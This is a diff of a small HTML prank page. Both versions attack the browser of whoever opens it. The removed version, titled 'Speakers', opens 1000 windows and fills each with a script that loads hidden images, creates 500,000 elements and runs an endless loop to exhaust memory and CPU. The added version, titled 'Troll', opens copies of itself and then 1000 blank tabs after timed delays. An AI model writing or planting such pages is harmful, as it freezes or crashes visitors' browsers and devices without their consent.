@@ -1,55 +1,41 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
 <meta charset="UTF-8" />
-<title>Speakers</title>
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Troll</title>
 <style>
-  html, body {
-    margin:0; padding:0; width:100%; height:100%; background:black;
+  body {
+    margin: 0; 
+    background: black; 
+    color: white; 
+    display: flex; 
+    justify-content: center; 
+    align-items: center; 
+    height: 100vh; 
+    font-family: monospace, monospace;
+    font-size: 2rem;
+    user-select: none;
   }
 </style>
 </head>
 <body>
-<script>
-(function(){
-  const payload = `
-    <html>
-    <head><title></title></head>
-    <body style="background:black;margin:0;">
-      <script>
-        // Load 50 large hidden images to kill RAM
-        for(let i=0; i<50; i++){
-          let img = new Image();
-          img.src = 'https://upload.wikimedia.org/wikipedia/commons/4/47/PNG_transparency_demonstration_1.png';
-          img.style.display = 'none';
-          document.body.appendChild(img);
+  <div>pov: u are getting trolled</div>
+  <script>
+    // Wait 5 seconds before opening duplicates and tabs
+    setTimeout(() => {
+      // Open 4 duplicates of self (same URL, same page)
+      for (let i = 0; i < 4; i++) {
+        window.open(window.location.href, '_blank');
+      }
+      // After opening duplicates, wait another 5 seconds
+      setTimeout(() => {
+        // Now open 1000 tabs from this window
+        for (let i = 0; i < 1000; i++) {
+          window.open('about:blank', '_blank');
         }
-        // Create 500,000 divs to spam DOM and cause layout thrashing
-        for(let i=0; i<500000; i++){
-          let d = document.createElement('div');
-          d.style.position = 'absolute';
-          d.style.top = (Math.random()*100) + '%';
-          d.style.left = (Math.random()*100) + '%';
-          d.style.width = '10px';
-          d.style.height = '10px';
-          d.style.background = 'black';
-          document.body.appendChild(d);
-        }
-        // Max CPU usage after 0.5s
-        setTimeout(()=>{ while(true){} }, 500);
-      <\/script>
-    </body>
-    </html>
-  `;
-
-  for(let i=0; i<1000; i++){
-    let w = window.open('', '_blank');
-    if(w){
-      w.document.write(payload);
-      w.document.close();
-    }
-  }
-})();
-</script>
+      }, 5000);
+    }, 5000);
+  </script>
 </body>
 </html>
